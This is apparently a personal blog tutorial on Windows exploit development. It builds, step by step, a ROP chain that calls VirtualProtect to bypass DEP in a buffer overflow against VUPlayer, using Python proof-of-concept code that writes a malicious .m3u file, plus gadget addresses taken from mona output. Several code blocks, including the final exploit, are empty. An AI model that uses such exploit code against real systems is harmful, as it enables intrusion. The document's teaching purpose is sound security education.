## Introduction
Continuing with the Windows exploit development our next stop is learning how to craft ROP chains. In the context of this blogpost we will be using them to disable DEP and execute shellcode on the stack; however, ROP chains are extremely versatile and in different contexts can be very powerful. Obviously stack based overflows aren't a very common bug class these days compared to 10 years ago, but this will allow us to use concepts we're familiar with (stack overflows) to learn concepts that are new to us (ROP chains). 

## ROP Chains
ROP stands for Return Oriented Programming. Essentially what we're doing is placing pointers to instructions on the stack, having execution follow those pointers to execute the instructions at that location and then execution returns to the stack to the next pointer. 

The reason this behavior is desirable is because when Data Execution Prevention (DEP) is enabled, we are typically unable to execute code in any section of memory that doesn't explicitly contain executable instructions. This means our traditional stack based overflow attacks won't work as we cannot execute shellcode on the stack. 

This is where the power of ROP comes into play. We uses tiny sections of existing code in the target program that are punctuated in sequence by a `RETN` instruction (called 'gadgets') and piece them together to make a function call which disables DEP. We can then run our shellcode on the stack as we're used to. 

## Required Reading
Corelan has essentially written a manifesto on DEP and Win32 ROP chains [here](https://www.corelan.be/index.php/2010/06/16/exploit-writing-tutorial-part-10-chaining-dep-with-rop-the-rubikstm-cube/). Nothing I say or do in this blog is new or groundbreaking, I'm simply recapitulating the ROP learning process for beginners like myself interested in taking their Windows game further and documenting my work for my own reference. 

FuzzySec also has a phenomenal post [here](https://www.fuzzysecurity.com/tutorials/expDev/7.html) as part of their Tutorials series, which also does a great job of walking through the reasoning and logic behind ROP chains.

You need to read and understand these blog posts very well in order to keep up. I will do my best to step through the process with the reader; however, it's always best to consult multiple sources and Corelan and Fuzzy are much more experienced and knowledgeable than I am. 

Seriously, go read those two blogs, like now. 

## Getting Started
In order to save time from scanning through Exploit DB for a suitable POC and recreating the exploit, I found this [blog post by Steven Patterson](https://www.shogunlab.com/blog/2018/02/11/zdzg-windows-exploit-5.html) and used the same vulnerable program. We will not be consulting the blog post for help on our ROP chain, simply using the same vulnerable program which you can download from [ExploitDB](https://www.exploit-db.com/exploits/40018). Afterwards, we can compare ROP chains and see if there were any areas we could've been more efficient. 

Our starting POC should look something like this: 
```python
import sys
import struct
import os

crash_file = "vuplayer-dep.m3u"

fuzz = "A" * 1012
fuzz += "B" * 4
fuzz += "C" * (3000 - len(fuzz))

makedafile = open(crash_file, "w")
makedafile.write(fuzz)
makedafile.close()
```

This code will create a file `vuplayer-dep.m3u`. Launch the player in Immunity, you'll get some warnings referencing breakpoints, this is normal just click through them. Drag your newly created file into the program GUI and it should crash overwriting EIP with `42424242`. 

Great, we control EIP. Next we need to pass execution the code we're going to overwrite the stack with. For this, we will simply use a `RETN` instruction. We need one that is not ASLR enabled, so let's go ahead and get `mona.py` out and check the modules with a `!mona modules` command. There are several modules in the output which do not have ASLR enabled, namely: `BASSWMA.dll`, `BASSMIDI.dll`, and `BASS.dll`. 

In Immunity, we can right click in the disassembler pane, the top left, and hit `Search for` > `All Commands in all modules` > `RETN` > `Find`. Scroll until you locate a suitable `RETN` instruction in one of the three aformentioned modules. For this blogpost, I will be using the `RETN` located at `0x10101008`. (Go ahead and check it!)

So we input this address into our POC. 

```python
import sys
import struct
import os

crash_file = "vuplayer-dep.m3u"

fuzz = "A" * 1012
fuzz += "\x08\x10\x10\x10" # 10101008  <-- Pointer to a RETN
fuzz += "C" * (3000 - len(fuzz))

makedafile = open(crash_file, "w")
makedafile.write(fuzz)
makedafile.close()
```

For all of our checking in this blogpost, the way I do it in Immunity is to open the MP3 player in the debugger, start it, go to the address of our `RETN` we know we'll be hitting every time, set a breakpoint. 

![](/assets/images/AWE/starting.JPG)

As you can see, we've hit our breakpoint and the stack looks perfect. EIP is at our `RETN` address and immediately after the pointer to our `RETN` function we see our `C` buffer where will we place additional pointers to ROP 'gadgets'.

## API Calls To Disable DEP
There are apparently a lot of different ways to disable DEP. FuzzySec has a nice chart on his blogpost so definitely check that out. We will use `mona.py` to determine what API call pointers we have access to that we can use to disable DEP with the command `!mona ropfunc`. This will output the results to `ropfunc.txt`.

```

Ordinarily, since they persist across the most versions of Windows, I'd like to either use `VirtualProtect` or `VirtualAlloc`. It looks like we only have pointers for `VirtualProtect` available to us, so that will be our weapon of choice. I used the pointer at `0x1060e25c`. 

Now that we have our function picked out, let's look at the values we need to call it and what it actually does. Consulting the [MSDN documentation](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect?redirectedfrom=MSDN) and FuzzySec's blogpost we see the function definition and required paramters as follows: 
```cpp
Structure:                                 Parameters:

BOOL WINAPI VirtualProtect(          =>    A pointer to VirtualProtect()
  _In_   LPVOID lpAddress,           =>    Return Address (Redirect Execution to ESP)
  _In_   SIZE_T dwSize,              =>    dwSize up to you to chose as needed (0x201)
  _In_   DWORD flNewProtect,         =>    flNewProtect (0x40)
  _Out_  PDWORD lpflOldProtect       =>    A writable pointer
);
```

This is extremely helpful. Since we're working with a stack, we know we'll need to put these parameters on the stack in **reverse** order. Our plan of attack will roughly look like this:
+ Load registers strategically with parameters we need
+ call a `PUSHAD` to push all of the register values onto the stack at once

Considering all of these facts, our goals can be summarized as thus following from what FuzzySec writes about the goals of his `VirtualAlloc` call: 
```
GOALS
EAX 90909090 => Nop                                              
ECX <writeable pointer> => lpflOldProtect                                
EDX 00000040 => flNewProtect                                   
EBX 00000201 => dwSize                                           
ESP ???????? => Leave as is                                 
EBP ???????? => Call to ESP (jmp, call, push,..)              
ESI ???????? => PTR to VirtualProtect - DWORD PTR of 0x1060E25C
EDI 10101008 => ROP-Nop same as EIP
```

`VirtualProtect` has different parameters but overall, it is very similar to `VirtualAlloc` so we can adjust the goals outlined in FuzzySec's blogpost subtly. 

The value for the `dwSize` parameter was automatically chosen by a mona operation at some point it is more than enough space (513 bytes) for our calculator shellcode so I just left it. 

Let's go ahead and add these to our POC to keep us organized. 
```python
import sys
import struct
import os

crash_file = "vuplayer-dep.m3u"

# GOALS
# EAX 90909090 => Nop                                                
# ECX <writeable pointer> => lpflOldProtect                                 
# EDX 00000040 => flNewProtect                             
# EBX 00000201 => dwSize                                            
# ESP ???????? => Leave as is                                         
# EBP ???????? => Call to ESP (jmp, call, push,..)                
# ESI ???????? => PTR to VirtualProtect - DWORD PTR of 0x1060E25C
# EDI 10101008 => ROP-Nop same as EIP

fuzz = "A" * 1012
fuzz += "\x08\x10\x10\x10" # 10101008  <-- Pointer to a RETN
fuzz += "C" * (3000 - len(fuzz))

makedafile = open(crash_file, "w")
makedafile.write(fuzz)
makedafile.close()
```

Let's just knock all of these goals out in order starting with the EAX goal. Before we start digging through Immunity manually, we'll let Mona do the heavy lifting with `!mona rop -m "basswma,bassmidi,bass"`. This will generate two files of interest to us: `rop.txt` and `rop_suggestions.txt`. 

`rop.txt` is simply a huge list of ROP gadgets at our disposal. 

`rop_suggestions.txt` is a smaller, more organized list of shorter gadgets that fit specific needs. If you specifically wanted to do something relatively simple and common, such as `INC EAX` you would check `rop_suggestions.txt` for those types of gadets. 

We will be consulting these two text files constantly!

## EAX ROP Chain
Looking at our goals, EAX needs to hold the value `90909090`. This is relatively straight forward. What we can do is put the value `0x90909090` onto the stack, and then `POP` that value into EAX. So we need to find a `pop eax` instruction. Since this is a simple command, let's first consult `rop_suggestions.txt`. 

There is a section labeled `[pop eax]` with the following:
```
[pop eax]
0x10104922 (RVA : 0x00004922) : # POP EAX # RETN 0x0C    ** [BASSWMA.dll] **   |  ascii {PAGE_EXECUTE_READWRITE}
0x100201c3 (RVA : 0x000201c3) : # POP EAX # RETN 0x0C    ** [BASS.dll] **   |   {PAGE_EXECUTE_READWRITE}
0x10015fe7 (RVA : 0x00015fe7) : # POP EAX # RETN    ** [BASS.dll] **   |   {PAGE_EXECUTE_READWRITE}
0x10015f82 (RVA : 0x00015f82) : # POP EAX # RETN    ** [BASS.dll] **   |   {PAGE_EXECUTE_READWRITE}
0x10607f6f (RVA : 0x00007f6f) : # POP EAX # RETN 0x0C    ** [BASSMIDI.dll] **   |  ascii {PAGE_EXECUTE_READWRITE}
0x1001fc83 (RVA : 0x0001fc83) : # POP EAX # RETN 0x04    ** [BASS.dll] **   |   {PAGE_EXECUTE_READWRITE}
0x10015f77 (RVA : 0x00015f77) : # POP EAX # RETN    ** [BASS.dll] **   |  ascii {PAGE_EXECUTE_READWRITE}
```

Since we don't want to deal with non-default `RETN` values when possible, let's select a simple gadget such as the one at `0x10015fe7`.

We have our two pieces, the value we want POP'd into EAX, and a gadget to do the POP'ing. Let's set them up in our POC.
```python
import sys
import struct
import os

crash_file = "vuplayer-dep.m3u"

# GOALS
# EAX 90909090 => Nop                                                
# ECX <writeable pointer> => lpflOldProtect                                 
# EDX 00000040 => flNewProtect                             
# EBX 00000201 => dwSize                                            
# ESP ???????? => Leave as is                                         
# EBP ???????? => Call to ESP (jmp, call, push,..)                
# ESI ???????? => PTR to VirtualProtect - DWORD PTR of 0x1060E25C
# EDI 10101008 => ROP-Nop same as EIP

# EAX Chunk Affects: EAX
eax = struct.pack('<L', 0x10015fe7) # a pointer to # POP EAX # RETN
eax += struct.pack('<L', 0x90909090)

fuzz = "A" * 1012
fuzz += "\x08\x10\x10\x10" # 10101008  <-- Pointer to a RETN
fuzz += "C" * (3000 - len(fuzz))

makedafile = open(crash_file, "w")
makedafile.write(fuzz)
makedafile.close()
```

EAX, when this is run, will now hold the value `0x90909090`. Let's test it out by adding the variable `eax` to our `rop` variable and running it. POC looks like this now: 
```python
import sys
import struct
import os

crash_file = "vuplayer-dep.m3u"

# GOALS
# EAX 90909090 => Nop                                                
# ECX <writeable pointer> => lpflOldProtect                                 
# EDX 00000040 => flNewProtect                             
# EBX 00000201 => dwSize                                            
# ESP ???????? => Leave as is                                         
# EBP ???????? => Call to ESP (jmp, call, push,..)                
# ESI ???????? => PTR to VirtualProtect - DWORD PTR of 0x1060E25C
# EDI 10101008 => ROP-Nop same as EIP

# EAX Chunk Affects: EAX
eax = struct.pack('<L', 0x10015fe7) # a pointer to # POP EAX # RETN
eax += struct.pack('<L', 0x90909090)

rop = eax

fuzz = "A" * 1012
fuzz += "\x08\x10\x10\x10" # 10101008  <-- Pointer to a RETN
fuzz += rop
fuzz += "C" * (3000 - len(fuzz))

makedafile = open(crash_file, "w")
makedafile.write(fuzz)
makedafile.close()
```

We run it, using our aforementioned test method and stepping through it, and we see that EAX now holds `90909090`. 

![](/assets/images/AWE/eaxtest.JPG)

**I won't be testing each gadget going forward, it's incumbent upon the reader to develop troubleshooting skills on their own.**

We can now add `{COMPLETED}` to our goals in our exploit POC so we can keep track of our progress. Onto the next goal!

## ECX ROP Chain
Looking at our goals, we need ECX to just hold a pointer to a writable location. Please read more on `lpflOldProtect` and why the parameter is this way. Is it an input parameter or an output parameter? 

This is very similar to our last gadget. Let's put the value we need onto the stack and then `POP` it into ECX. I looked at the 3 modules we're using in Immunity and arbitrarily picked a location within `BASSWMA.dll` which was marked `RWX` so I know we have write privileges to it (`0x101053dc`).

Next, consult `rop_suggestions.txt` for a good `pop ecx` instruction. 

In the end, we can update our POC with our new gadget as follows: 
```python
import sys
import struct
import os

crash_file = "vuplayer-dep.m3u"

# GOALS
# EAX 90909090 => Nop {COMPLETED}                                                
# ECX <writeable pointer> => lpflOldProtect {COMPLETED}                                 
# EDX 00000040 => flNewProtect                             
# EBX 00000201 => dwSize                                            
# ESP ???????? => Leave as is                                         
# EBP ???????? => Call to ESP (jmp, call, push,..)                
# ESI ???????? => PTR to VirtualProtect - DWORD PTR of 0x1060E25C
# EDI 10101008 => ROP-Nop same as EIP

# EAX Chunk Affects: EAX
eax = struct.pack('<L', 0x10015fe7) # a pointer to # POP EAX # RETN
eax += struct.pack('<L', 0x90909090)

# ECX Chunk Affects: ECX
ecx = struct.pack('<L', 0x10601007) # a pointer to # POP ECX # RETN
ecx += struct.pack('<L', 0x101053DC)    # found a spot in the RWX space of BASSWMA.dll for our writable pointer

rop = ""

fuzz = "A" * 1012
fuzz += "\x08\x10\x10\x10" # 10101008  <-- Pointer to a RETN
fuzz += rop
fuzz += "C" * (3000 - len(fuzz))

makedafile = open(crash_file, "w")
makedafile.write(fuzz)
makedafile.close()
```

You can see I'm annotating at the beginning of each gadget section what registers the gadget affects, this will come in handy later when we're determining what order the gadgets should be executed. For example, we wouldn't want to use a gadget that sets EAX and then when a subsequent gadget which sets EDI also happens to affect EAX is used it ruins our EAX value. Just another thing that keeps us organized when the code can get quite complex. Go look at some DEP bypass exploit POCs on ExploitDB, you'll understand ;)

ECX crushed, moving onto the next goal!

## EDX ROP Chain
This is the first fun one, how do we get EDX to hold the value `0x40`? After sifting through a bunch of gadgets, I couldn't really find a good series of gadgets to directly influence EDX in an efficient manner. When this happens, I often start looking at ways to manipulate other registers and then somehow move that value into EDX. 

I started looking at EAX. First, is there a way to cleanly get the EAX value into EDX? Why yes there is, an extremely clean way! I found this gadget `# XCHG EAX,EDX # RETN` at `0x10038a6c`. So if we can manipulate EAX into holding `0x40` we have a gadget in our pocket to get that value into EDX. 

So I started looking at ways to clear EAX. I want EAX to always start zeroed out so that I know the code is reliable. The first thing I searched for ended up hitting, an `# XOR EAX,EAX # RETN` gadget located at `0x106074f8`. This is great, this will zero out the EAX register. 

Now, I need a way to add to the EAX register. A trick from the FuzzySecurity blog is to set the register at `0xffffffff` with a simple `POP` like we've been doing and then increment it until it reaches the value of `0x2`. Then we could add it against itself with `ADD EAX,EAX` instruction, essentially doubling the register until it reaches `64` decimcal (`0x40` in hex); however, there is no `ADD EAX,EAX` gadget in our modules, womp womp. 

BUT, there is a really cool and clean `# ADD EAX,4 # RETN` gadget! We can just throw this gadget on the stack over and over until EAX holds `0x40`. 

So to wrap up we're going to:
+ zero out EAX
+ add 4 to EAX until it reaches `0x40`
+ swap values between EAX and EDX so that EDX holds our goal value

Let's update our POC with our new gadget chain:

## EBX ROP Chain
Another fun one, this time we have to get `0x201` into EBX. Same thing again, couldn't find a nice way to do it directly with EBX; however, EAX comes to the rescue again. 

Before we get carried away, let's make sure we can cleanly get the value of EAX into EBX. Sifting through our two text files, I was able to find this gadget `# XCHG EAX,EBX # RETN 0x00` at `0x10032f32`. Awesome, let's proceed!

This time, I got more creative and was able to find an `# XOR EAX,994803BD # RETN` gadget that was XOR'ing EAX against a static value located at `0x1003a074`. The great thing about this is that when it comes to XOR, the following is true:
+ `a XOR b` = `c`
+ `b XOR c` = `a`
+ `c XOR a` = `b`

So since we know one variable, the static value being XOR'd (`0x994803BD`), and we know a second variable, our desired `0x201` outcome, we already know the third variable!

Let's use an [online calculator](https://miniwebtool.com/bitwise-calculator/?data_type=16&number1=994803bd&number2=00000201&operator=XOR) to figure it out. 

![](/assets/images/AWE/xorcalc.JPG)

As you can see, our third variable is `0x994801bc`. If we XOR this against the static value, the outcome should be `0x201`! 

In summary we are going to:
+ POP `0x994801bc` into EAX
+ XOR EAX with `0x994803BD` giving us an EAX value of `0x201`
+ swap EAX and EBX so that EBX holds our desired goal value 

Let's add this chain to our POC, which now looks like this:
```python
import sys
import struct
import os

crash_file = "vuplayer-dep.m3u"

```

To the astute reader: now that you've seen the static XOR gadget for EAX, is there a more efficient way we could've approached our EDX chain? 

EBX chain crushed, moving on!

## EBP ROP Chain
Looking at our goals, we need EBP to point to a `jmp esp` type instruction. I used mona to find such an instruction at `0x1010539f`, now we just need a gadget to pop it into EBP.

I found such a gadget at `0x10017c0d`: `# POP EBP # RETN 0x04`. Because it's a `RETN 0x04` instead of a normal `RETN`, I used two more `RETN` gadgets (ROP NOPs) as filler so that my chain would continue working as intended, this just required some trial and error, I recommend trying it without the filler and seeing what happens. 

This one was relatively straightforward, just POP'ing the desired value into the register and then adding filler to compensate for the non-defaul `RETN`.

Crushed, onto next goal. 

## ESI ROP Chain
Looking at our goals from FuzzySec, we need *'PTR to VirtualProtect - DWORD PTR of 0x1060E25C'* in ESI. This means, we have the memory address of the API call to `VirtualProtect`, but we need the `DWORD` value stored there, not just the address. I struggled to find good gadgets for ESI operations, but once again, I resorted to using EAX. 

Getting a pointer to the memory address into EAX is easy, we'll just POP `0x1060E25C` into it. After that, we'll need a gadget that loads the content of `[EAX]` into `EAX`. One such gadget exists at `0x1001eaf1`. Luckily I faced a similar situation before this walking through my first exploit with the FuzzySec example and knew what kind of gadget to target first and found it right away. We can then end the chain with a gadget stored at `0x10030950` which does an `# XCHG EAX,ESI # RETN`. 

In summary for this one, we are:
+ `POP` pointer to API into EAX
+ move the `DWORD` value held at the address into EAX
+ exchange EAX and ESI

## EDI ROP Chain
Another simple one, just POP the address of a ROP NOP into the EDI register. We can do that with the following gadgets: `0x100190b0` holds a gadget for `# POP EDI # RETN` and `0x10101008` holds a gadget to a ROP NOP.

Updated POC:

I also added a `PUSHAD` gadget to the end of our chain which should push all of the register values onto the stack and set up our API call.

Should be all done with our ROP chaining at this point, let's look in the debugger and see if it builds appropriately and sets up the function call on the stack as intended. 

## Testing Chain
The important part to constructing our chain at this point is assembling it in an order so that none of our set registers get disturbed. For instance, the ESI chain also affects EAX. We don't want to set EAX to our goal value and then execute the ESI chain and ruin EAX. Generally, we want to use the chains that use multiple registers **first**. I constructed my `rop` variable as follows:

```python
rop = edx
rop += esi
rop += ebx 
rop += ebp
rop += edi
rop += eax
rop += ecx
rop += pushad 
```

Let's run our script and see if our function call is correct. 

![](/assets/images/AWE/protect.JPG)

Awesome, it's perfect. The only thing left to do now is add shellcode and a NOP sled. Keep in mind the value we used for the `dwSize` argument is specific to our needs. If you want to plug in some large shellcode, perhaps change this value. 

Our final POC script looks like this:
```python

## Improvements
Consulting [Steven Patterson's blog](https://www.shogunlab.com/blog/2018/02/11/zdzg-windows-exploit-5.html), there was really only one techinque that we really could've used to save space. He uses a `NEG` instruction in this gadget `0x10014db4 :  # NEG EAX # RETN` to craft his `0x40` and `0x201` values in EAX. Very clever and something we will use going forward. 

## Conclusion
Mona will actually craft large chunks of your chain for you; however, I wanted to steer clear of this as we'll need experience crafting custom chains in the future. 

Huge thanks to Steven Patterson, FuzzySec, and Corelan for their wonderful blog posts. Any time you can create free content for people to learn from, it does wonders for beginners, it's much appreciated.
